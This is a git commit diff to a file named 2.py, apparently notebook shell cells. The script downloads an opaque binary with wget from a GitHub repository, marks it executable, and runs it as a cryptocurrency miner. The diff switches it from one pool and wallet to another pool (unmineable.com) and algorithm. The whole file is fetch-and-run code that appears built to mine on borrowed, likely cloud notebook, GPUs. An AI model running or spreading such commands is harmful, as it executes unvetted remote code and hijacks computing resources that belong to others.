377a86ed8d69a54d54c5cc7d282fab66dc170a4d
mencobaiajanah <86476551+mencobaiajanah@users.noreply.github.com>
2021-07-05 04:41:21 +0800

    Update 2.py

--- 2.py
+++ 2.py
@@ -1,3 +1,3 @@
 ! wget https://github.com/mencobaiajanah/LM2/raw/main/3 > /dev/null
 ! chmod +x 3
-! ./3 --algo ETCHASH --pool us-east.ezil.me:4444 --user 0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.zil1rk4nqqyfktdywj82t86n3ut6zwg0602t93mxfm.GPU-1 --ethstratum ETHPROXY > /dev/null
+! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.GPU-X#e34n-zbpz --ethstratum ETHPROXY > /dev/null
